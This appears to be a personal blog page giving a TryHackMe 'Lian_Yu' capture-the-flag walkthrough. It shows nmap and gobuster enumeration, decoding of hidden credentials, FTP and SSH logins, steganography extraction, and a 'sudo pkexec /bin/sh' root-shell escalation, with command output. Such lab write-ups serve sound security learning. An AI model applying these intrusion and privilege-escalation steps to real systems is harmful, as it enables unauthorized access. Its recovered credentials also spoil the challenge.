@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lian_Yu Writeup | Bisc's Security Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #080c10;
+            --card-bg: #0d121d;
+            --accent-green: #00ff88;
+            --accent-cyan: #00e5ff;
+            --text-main: #c9d1d9;
+            --text-muted: #8b949e;
+            --border-color: #1f293d;
+            --code-bg: #05080c;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+            border-left: 1px solid var(--border-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-green);
+            border-radius: 3px;
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.6);
+        }
+        * {
+            scrollbar-width: auto;
+            scrollbar-color: var(--accent-green) var(--bg-color);
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-right: 1px solid var(--border-color);
+            padding: 2rem 1.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: fixed;
+            height: 100vh;
+        }
+
+        .avatar-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 1rem;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 15px;
+            object-fit: cover;
+            border: 2px solid var(--accent-green);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .profile-name {
+            font-family: 'Fira Code', monospace;
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 0.2rem;
+        }
+
+        .profile-rank {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            margin-bottom: 0.8rem;
+        }
+
+        .profile-bio {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 1.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .nav-links {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin-bottom: auto;
+        }
+
+        .nav-btn {
+            display: block;
+            text-align: left;
+            padding: 0.6rem 1rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            transition: 0.2s ease;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .social-links {
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn-external {
+            display: block;
+            text-align: center;
+            padding: 0.6rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--accent-cyan);
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            transition: 0.2s ease;
+        }
+
+        .btn-external:hover {
+            background: var(--accent-cyan);
+            color: #000;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
+        }
+
+        .main-content {
+            margin-left: 300px;
+            flex: 1;
+            min-width: 0;
+            padding: 3rem;
+            max-width: 900px;
+        }
+
+        .breadcrumbs {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            overflow-wrap: anywhere;
+        }
+
+        .breadcrumbs a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        .breadcrumbs a:hover {
+            text-decoration: underline;
+        }
+
+        .article {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 2rem;
+            min-width: 0;
+            overflow: hidden;
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+
+        .tag {
+            background: rgba(0, 229, 255, 0.1);
+            color: var(--accent-cyan);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+        }
+
+        .article h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            overflow-wrap: anywhere;
+        }
+
+        .article h2 {
+            color: var(--accent-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 1.1rem;
+            margin: 1.8rem 0 0.8rem 0;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.3rem;
+            overflow-wrap: anywhere;
+        }
+
+        .article p, .article ul {
+            margin-bottom: 1rem;
+            color: var(--text-main);
+            font-size: 0.95rem;
+            overflow-wrap: anywhere;
+            word-break: break-word;
+        }
+
+        .article ul {
+            padding-left: 1.2rem;
+        }
+
+        .article li {
+            margin-bottom: 0.4rem;
+        }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--accent-green);
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #e6edf3;
+            margin: 1rem 0;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent-cyan);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        .cyber-link {
+            color: var(--accent-cyan);
+            font-family: 'Fira Code', monospace;
+            font-weight: 600;
+            text-decoration: none;
+            border-bottom: 1px dashed rgba(0, 229, 255, 0.5);
+            padding: 1px 4px;
+            border-radius: 3px;
+            transition: all 0.2s ease;
+        }
+
+        .cyber-link:hover {
+            color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.08);
+            border-bottom-color: var(--accent-green);
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+        }
+
+        @media (max-width: 1055px) {
+            body { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid var(--border-color); }
+            .main-content { margin-left: 0; padding: 1.5rem; width: 100%; max-width: 100%; }
+        }
+
+        @media (max-width: 600px) {
+            .main-content { padding: 1.5rem; }
+            .article { padding: 2rem; }
+            pre { padding: 0.75rem; font-size: 0.78rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="avatar-container">
+            <img src="/avatar2.jpeg" alt="Bisc Profile Picture" class="avatar">
+        </div>
+        <h2 class="profile-name">Bisc</h2>
+        <p class="profile-rank">[0x8][HACKER]</p>
+        <p class="profile-bio">I love biscuits 🙃🍪</p>
+
+        <nav class="nav-links">
+            <a href="/index.html" class="nav-btn">~/home</a>
+            <a href="/ctf/index.html" class="nav-btn active">~/ctf</a>
+            <a href="/about/index.html" class="nav-btn">~/about</a>
+        </nav>
+
+        <div class="social-links">
+            <a href="https://tryhackme.com/p/Bisc" target="_blank" class="btn-external">TryHackMe Profile</a>
+        </div>
+    </aside>
+
+    <main class="main-content">
+        <div class="breadcrumbs">
+            <a href="/index.html">home</a> / <a href="/ctf/index.html">ctf</a> / <a href="/ctf/tryhackme/index.html">tryhackme</a> / <span style="color: var(--text-main);">Lian_Yu</span>
+        </div>
+
+        <article class="article">
+            <div class="article-meta">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">Web Enumeration</span>
+                <span class="tag">Steganography</span>
+                <span class="tag">Hex Editing</span>
+                <span class="tag">Privilege Escalation</span>
+                <span class="tag">Easy</span>
+            </div>
+
+            <h1>Lian_Yu — Room Walkthrough</h1>
+            <p>Lian_Yu is an <em>Arrow</em>-themed TryHackMe challenge set on the remote island of Lian Yu. Rather than relying on a single exploit, the machine chains together multi-stage web directory enumeration, hidden HTML inspection, Base58 decoding, FTP exploration, PNG header repair, steganography extraction, SSH login, and privilege escalation via <code>pkexec</code>.</p>
+
+            <h2>01. Reconnaissance &amp; Web Enumeration</h2>
+            <p>I began by running an aggressive Nmap scan with default scripts and service version detection (<code>-A -sC</code>) against the target IP address (<code>10.112.163.166</code>) to map out open ports and running services:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ nmap -A -sC 10.112.163.166
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-18 11:10 -0500
+Nmap scan report for 10.112.163.166
+Host is up (0.063s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 3.0.2
+22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
+|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
+|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
+|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
+80/tcp  open  http    Apache httpd
+|_http-title: Purgatory
+|_http-server-header: Apache
+111/tcp open  rpcbind 2-4 (RPC #100000)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+            <p>The scan exposed four open ports: <strong>FTP (21)</strong> running <code>vsftpd 3.0.2</code>, <strong>SSH (22)</strong> running <code>OpenSSH 6.7p1</code> on Debian, <strong>HTTP (80)</strong> running Apache with the title <em>"Purgatory"</em>, and <strong>rpcbind (111)</strong>.</p>
+
+            <p>First, I checked <code>vsftpd 3.0.2</code> using <code>searchsploit</code> to see if any direct exploit modules were available, which returned no results:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ searchsploit vsftpd3.0.2
+Exploits: No Results
+Shellcodes: No Results</code></pre>
+
+            <p>Moving to the web server on port 80, visiting <code>http://10.112.163.166/</code> and inspecting the page source did not reveal any immediate leads. To uncover hidden paths, I ran <code>gobuster</code> with <code>directory-list-2.3-medium.txt</code>—a balanced wordlist that is neither too small nor overly slow—along with <code>html,js,txt</code> extensions:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ gobuster dir -u http://10.112.163.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,js,txt
+
+index.html           (Status: 200) [Size: 2506]
+island               (Status: 301) [Size: 237] [--&gt; http://10.112.163.166/island/]</code></pre>
+
+            <p>Gobuster found the <code>/island/</code> directory (HTTP 301). Opening <code>http://10.112.163.166/island/</code> displayed a message referencing Lian_Yu and ending with <em>"The Code Word is:"</em>, with no visible text after the colon. Inspecting the HTML source exposed a white-colored heading blending into the page:</p>
+
+<pre><code>&lt;p&gt;You should find a way to &lt;b&gt; Lian_Yu&lt;/b&gt; as we are planed. The Code Word is: &lt;/p&gt;&lt;h2 style="color:white"&gt; vigilante&lt;/style&gt;&lt;/h2&gt;</code></pre>
+
+            <p>I saved <code>vigilante</code> in my notes as a potential username and ran a second <code>gobuster</code> scan inside <code>http://10.112.163.166/island/</code> using <code>html,txt</code> extensions:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ gobuster dir -u http://10.112.163.166/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt
+
+index.html           (Status: 200) [Size: 345]
+2100                 (Status: 301) [Size: 242] [--&gt; http://10.112.163.166/island/2100/]</code></pre>
+
+            <p>This uncovered the subdirectory <code>2100</code> at <code>http://10.112.163.166/island/2100/</code>.</p>
+            <p><strong>Web Directory Found (Flag 1):</strong> <code>2100</code></p>
+
+            <h2>02. Discovering the Ticket &amp; Decoding the FTP Password</h2>
+            <p>Visiting <code>http://10.112.163.166/island/2100/</code> showed an unavailable YouTube video and the prompt <em>"How Oliver Queen finds his way to Lian_Yu?"</em>. Nothing obvious appeared on the rendered page, so I opened the source code/inspector and found an HTML comment pointing to a custom <code>.ticket</code> extension:</p>
+
+<pre><code>&lt;!-- you can avail your .ticket here but how?   --&gt;</code></pre>
+
+            <p>Because the comment specifically asked how to get a <code>.ticket</code> <em>"here"</em> (inside <code>/island/2100/</code>), I ran <code>gobuster</code> on that exact path with <code>-x ticket</code>:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ gobuster dir -u http://10.112.163.166/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
+
+green_arrow.ticket   (Status: 200) [Size: 71]</code></pre>
+
+            <p>Gobuster quickly returned <code>green_arrow.ticket</code>.</p>
+            <p><strong>File Name Found (Flag 2):</strong> <code>green_arrow.ticket</code></p>
+
+            <p>Accessing <code>http://10.112.163.166/island/2100/green_arrow.ticket</code> revealed a short note and an encoded string:</p>
+
+<pre><code>This is just a token to get into Queen's Gambit(Ship)
+
+
+RTy8yhBQdscX</code></pre>
+
+            <p>Trying <code>RTy8yhBQdscX</code> directly as the password for <code>vigilante</code> on FTP failed. Suspecting a Base encoding format (such as Base32, Base45, Base58, Base62, Base64, or Base85), I tested the string in <a href="https://cyberchef.org/" target="_blank" class="cyber-link">CyberChef ↗</a> and found that decoding it as <strong>Base58</strong> produced <code>!#th3h00d</code>.</p>
+
+            <p>Testing <code>vigilante</code> with <code>!#th3h00d</code> on FTP succeeded, confirming the FTP password.</p>
+            <p><strong>FTP Password (Flag 3):</strong> <code>!#th3h00d</code></p>
+
+            <h2>03. FTP Enumeration, Header Repair &amp; Steganography</h2>
+            <p>Once authenticated over FTP as <code>vigilante</code>, I listed the files in the current directory (<code>/home/vigilante</code>) and downloaded all three image files to my machine:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ ftp vigilante@10.112.163.166
+Connected to 10.112.163.166.
+220 (vsFTPd 3.0.2)
+331 Please specify the password.
+Password: 
+230 Login successful.
+ftp&gt; ls
+-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
+-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
+-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
+ftp&gt; get Leave_me_alone.png
+ftp&gt; get Queen's_Gambit.png
+ftp&gt; get aa.jpg</code></pre>
+
+            <p>Next, I moved up to <code>/home</code> via FTP to see what other local accounts existed on the system and spotted the user <code>slade</code>:</p>
+
+<pre><code>ftp&gt; pwd
+Remote directory: /home/vigilante
+ftp&gt; cd ..
+250 Directory successfully changed.
+ftp&gt; ls
+drwx------    2 1000     1000         4096 May 01  2020 slade
+drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante</code></pre>
+
+            <p>I noted <code>slade</code> and exited FTP. When opening the downloaded images locally, <code>Queen's_Gambit.png</code> and <code>aa.jpg</code> displayed properly, whereas <code>Leave_me_alone.png</code> failed to open. Inspecting <code>Leave_me_alone.png</code> in <code>hexeditor</code> revealed that the first six bytes of its PNG signature were corrupted (<code>58 45 6F AE 0A 0D</code> instead of the standard PNG header <code>89 50 4E 47 0D 0A 1A 0A</code>):</p>
+
+<pre><code># Corrupted bytes at offset 0x00000000
+00000000  58 45 6F AE  0A 0D 1A 0A   00 00 00 0D  49 48 44 52  XEo.........IHDR
+
+# Fixed PNG header bytes
+00000000  89 50 4E 47  0D 0A 1A 0A   00 00 00 0D  49 48 44 52  .PNG........IHDR</code></pre>
+
+            <p>After updating the header to <code>89 50 4E 47 0D 0A</code> and saving the file, <code>Leave_me_alone.png</code> opened normally and showed a man with a gun alongside text ending with the word <code>password</code> in larger red letters.</p>
+
+            <p>Trying <code>slade</code> with <code>password</code> on FTP and SSH did not work.</p>
+
+            <div style="display: flex; justify-content: center; margin: 1.25rem 0;">
+                <img src="/my-stickers/sticker30.png" alt="sticker" style="width: 250px; height: auto;">
+            </div>
+
+            <p>Soooooooo I saved <code>password</code> as a potential password. Running <code>steghide</code> on <code>Queen's_Gambit.png</code> failed because PNG is not a supported format in <code>steghide</code>, so I ran <code>steghide --info aa.jpg</code> and extracted the hidden archive <code>ss.zip</code> using <code>password</code>:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ steghide --info Queen's_Gambit.png
+steghide: the file format of the file "Queen's_Gambit.png" is not supported.
+
+┌──(bisc㉿kali)-[~]
+ └─$ steghide --info aa.jpg
+"aa.jpg":
+  format: jpeg
+  capacity: 11.0 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "ss.zip":
+    size: 596.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes</code></pre>
+
+            <p>Extracting <code>ss.zip</code> with <code>unzip</code> produced two files: <code>passwd.txt</code> (a thematic note about Oliver Queen on Lian_Yu) and <code>shado</code>, which contained <code>M3tahuman</code>:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ unzip ss.zip
+Archive:  ss.zip
+  inflating: passwd.txt              
+  inflating: shado
+
+┌──(bisc㉿kali)-[~]
+ └─$ cat passwd.txt
+This is your visa to Land on Lian_Yu # Just for Fun ***
+
+
+a small Note about it
+
+
+Having spent years on the island, Oliver learned how to be resourceful and 
+set booby traps all over the island in the common event he ran into dangerous
+people. The island is also home to many animals, including pheasants,
+wild pigs and wolves.
+
+┌──(bisc㉿kali)-[~]
+ └─$ cat shado
+M3tahuman</code></pre>
+
+            <p><strong>File Name with SSH Password (Flag 4):</strong> <code>shado</code></p>
+
+            <h2>04. SSH Access &amp; User Flag</h2>
+            <p>With the username <code>slade</code> from <code>/home</code> and the password <code>M3tahuman</code> from <code>shado</code>, I logged into the target over SSH, listed the home directory including hidden files, and read <code>user.txt</code>:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ ssh slade@10.112.163.166
+slade@10.112.163.166's password: 
+                              Way To SSH...
+                          Loading.........Done.. 
+                   Connecting To Lian_Yu  Happy Hacking
+slade@LianYu:~$ ls -al
+total 32
+drwx------ 2 slade slade 4096 May  1  2020 .
+drwxr-xr-x 4 root  root  4096 May  1  2020 ..
+-rw------- 1 slade slade   22 May  1  2020 .bash_history
+-rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
+-rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
+-r-------- 1 slade slade   77 May  1  2020 .Important
+-rw-r--r-- 1 slade slade  675 May  1  2020 .profile
+-r-------- 1 slade slade   63 May  1  2020 user.txt
+
+slade@LianYu:~$ cat user.txt
+THM{P3*********************************T}
+                        --Felicity Smoak</code></pre>
+
+            <p><strong>User Flag (Flag 5):</strong> <code>THM{P3*********************************T}</code></p>
+
+            <h2>05. Privilege Escalation &amp; Root Flag</h2>
+            <p>Moving to the filesystem root (<code>/</code>) and attempting to enter <code>/root</code> returned <code>Permission denied</code> for <code>slade</code>. To check what elevated commands <code>slade</code> could run, I executed <code>sudo -l</code>:</p>
+
+<pre><code>slade@LianYu:/$ cd root
+-bash: cd: root: Permission denied
+
+slade@LianYu:/$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec</code></pre>
+
+            <p><code>slade</code> can run <code>/usr/bin/pkexec</code> as <code>root</code> after entering <code>slade</code>'s password. Looking up <code>pkexec</code> on <a href="https://gtfobins.org/gtfobins/pkexec/" target="_blank" class="cyber-link">GTFOBins ↗</a> showed that running <code>pkexec /bin/sh</code> via <code>sudo</code> spawns a root shell. After supplying <code>M3tahuman</code>, I confirmed root access with <code>whoami</code>, listed <code>/root</code>, and read <code>root.txt</code>:</p>
+
+<pre><code>slade@LianYu:/$ sudo pkexec /bin/sh
+[sudo] password for slade: 
+# whoami
+root
+# ls
+root.txt
+# cat root.txt
+                          Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---&gt; Now slade Will become DEATHSTROKE. 
+
+
+
+THM{MY_W0RD************************************************************************BE_D34D}
+                                                                              --DEATHSTROKE</code></pre>
+
+            <p><strong>Root Flag (Flag 6):</strong> <code>THM{MY_W0RD************************************************************************BE_D34D}</code></p>
+
+<p style="color: var(--accent-green); font-family: 'Fira Code', monospace; margin-top: 1.5rem; font-weight: 600;">
+[+] Flags captured! Time for a biscuit 😋🍪
+</p>
+
+        </article>
+    </main>
+
+</body>
+</html>
